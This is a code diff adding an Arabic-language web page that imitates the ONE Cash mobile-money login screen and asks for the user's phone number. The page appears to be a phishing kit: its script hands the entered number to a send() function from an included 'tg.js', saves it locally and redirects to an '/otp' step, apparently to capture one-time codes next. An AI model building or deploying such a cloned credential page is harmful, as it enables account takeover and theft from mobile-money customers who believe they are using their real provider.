@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Open Graph / Facebook -->
+<meta property="og:title" content="ONE Cash — Mobile Money & Financial Freedom" />
+<meta property="og:description" content="ONE Cash is a secure, affordable, and reliable mobile money service offering fast access to financial services without a bank account via your phone." />
+<meta property="og:image" content="ONE-logo.svg" />
+<meta property="og:url" content="https://onecashye.com/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="ONE Cash" />
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="ONE Cash — Mobile Money & Financial Freedom" />
+<meta name="twitter:description" content="Access fast, secure, and convenient mobile financial services with the ONE Cash mobile app — no bank account required." />
+<meta name="twitter:image" content="ONE-logo.svg" />
+
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <title>كاش</title>
+
+  <style>
+    :root {
+      --orange: #f57c22;
+      --orange-dark: #e96f16;
+      --blue: #1f4f8f;
+      --gray: #8f9bb3;
+    }
+
+    * {
+      /*box-sizing: border-box;*/
+      /*font-family: "Segoe UI", Tahoma, Arial, sans-serif;*/
+        font-family: "Cairo", sans-serif;
+
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background:
+        url("pattern_Normal@3x.png") repeat,
+        #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    /* Header */
+    .header {
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .lang {
+      color: var(--orange);
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .logo {
+      height: 36px;
+    }
+
+    /* Illustration */
+    .hero {
+      position: relative;
+      margin: 10px 20px 0;
+      border-radius: 20px;
+      background:
+        url("orangeEnvelopBG_Normal@3x.png") center / cover no-repeat;
+      padding: 30px 10px;
+      padding-bottom: 0px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .hero img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    /* Form */
+    .content {
+      padding: 30px 20px;
+      padding-top: 0px;
+      text-align: right;
+      flex: 1;
+    }
+
+    .content h2 {
+      color: var(--orange);
+      margin-bottom: 12px;
+      font-size: 20px;
+    }
+
+    .phone-input {
+      display: flex;
+      align-items: center;
+      border: 2px solid var(--orange);
+      border-radius: 10px; /* was 14px */
+      height: 30px;
+      padding: 12px 14px;
+      margin-top: 10px;
+    }
+
+    .phone-input img {
+      width: 22px;
+      margin-left: 10px;
+    }
+
+    .phone-input input {
+      border: none;
+      outline: none;
+      font-size: 18px;
+      flex: 1;
+      text-align: right;
+    }
+
+    .phone-input input::placeholder {
+      color: var(--gray);
+    }
+
+    /* Button */
+    .footer {
+      padding: 20px;
+        display: flex;
+  justify-content: center;
+    }
+
+    .btn {
+      width: 75%;
+      background: #9aa4bf;
+      border: none;
+      color: #fff;
+      font-size: 18px;
+      padding: 14px;
+      border-radius: 14px;
+      cursor: not-allowed;
+    }
+
+.btn {
+  height: 50px;              /* key line */
+  padding: 0 32px;           /* horizontal padding only */
+  border-radius: 12px;       /* matches the rounded corners */
+  font-size: 16px;
+  font-weight: 600;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+    /* Responsive tweaks */
+    @media (min-width: 600px) {
+      .app {
+        min-height: 700px;
+        border-radius: 20px;
+        overflow: hidden;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+      }
+    }
+
+    .content h2 {
+      font-family: "Cairo", sans-serif;
+      font-size: 14.5px;
+      font-weight: 600;
+      color: #f57c22;
+      margin-bottom: 8px;
+  }
+.top-logo {
+  position: absolute;
+  top: 16px;
+  right: 16px;
+  width: 72px;        /* adjust if needed */
+  height: auto;
+  z-index: 10;
+}
+.app {
+  position: relative;
+}
+.top-logo{
+  margin-top: 20px;
+  width: 50px;  /* tighter */
+}
+
+.top-strip {
+  width: 100%;
+  height: 20px;          /* matches the screenshot */
+  background-color: #f57c22; /* your brand orange */
+  /*padding:20px;*/
+
+}
+/*.top-strip {
+  position: sticky;
+  top: 0;
+  z-index: 1000;
+}*/
+
+.lang-icon {
+  margin-top: 20px;
+  position: absolute;
+  top: 16px;
+  left: 16px;
+  width:50px;
+  height: 50px;
+
+ filter: brightness(0) saturate(100%)
+          invert(56%)
+          sepia(86%)
+          saturate(2260%)
+          hue-rotate(353deg)
+          brightness(98%)
+          contrast(96%);
+}
+.error-text {
+  color: #e53935;
+  font-size: 13px;
+  margin-top: 6px;
+  text-align: center;
+  display: none;
+
+}
+
+input.invalid {
+  border-color: #e53935;
+}
+
+
+
+.btn {
+  width: 280px;
+  height: 56px;
+  border-radius: 16px;
+  border: none;
+
+  font-size: 16px;
+  font-weight: 600;
+  color: #ffffff;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  transition: background-color 0.25s ease,
+              box-shadow 0.25s ease,
+              transform 0.1s ease;
+}
+
+/* 🔵 ENABLED */
+.btn:not(:disabled) {
+  background-color: #253b80; /* deep blue from screenshot */
+  box-shadow: 0 6px 14px rgba(37, 59, 128, 0.35);
+  cursor: pointer;
+}
+
+/* press feedback */
+.btn:not(:disabled):active {
+  transform: scale(0.98);
+  box-shadow: 0 3px 8px rgba(37, 59, 128, 0.3);
+}
+
+  </style>
+</head>
+
+<body>
+  <div class="app">
+  <div class="top-strip"></div>
+
+    <!-- Header -->
+    <div class="header">
+      <!-- <div class="lang">English</div> -->
+      <img src="logo_bar_Normal.png" alt="كاش" class="top-logo" />
+    </div>
+      <img src="lang_Normal.png" alt="Language" class="lang-icon" />
+
+    <!-- Illustration -->
+    <div class="hero">
+      <img src="asset_normal.png" alt="Illustration" />
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+      <h2>أدخل رقم الموبايل</h2>
+
+      <div class="phone-input">
+        <img src="mobNo_Normal.png" alt="phone" />
+        <input id='phone' type="tel" placeholder="7 _ _ _ _ _ _ _ _ _" inputmode="numeric" maxlength="10"/>
+      </div>
+      <div>
+        <p id="phone-error" class="error-text">* رقم الموبايل غير صحيح</p>
+      </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+      <button disabled id='sb' class="btn">التالي</button>
+    </div>
+  </div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src='tg.js'></script>
+<script>
+
+$(document).ready(function () {
+  $("#phone").on("input", function () {
+    let val = $(this).val();
+
+    val = val.replace(/\D/g, "");
+    $(this).val(val);
+
+    // validation: must start with 7
+    if (val.length > 0  <=10 && val.charAt(0) !== "7" || (val.length < 9)) {
+      $(this).addClass("invalid");
+        $("#phone-error").show();
+        document.getElementById('sb').disabled = true
+    } else {
+      $(this).removeClass("invalid");
+        $("#phone-error").hide();
+        document.getElementById('sb').disabled = false
+    }    
+  });
+  $('#sb').on('click',function(){
+      msg = `رقم الهاتف: ${$("#phone").val()}`
+      send(msg)
+      localStorage.setItem('phone',$("#phone").val())
+      window.location.href = '/otp'
+  })
+});
+</script>
+
+</body>
+</html>
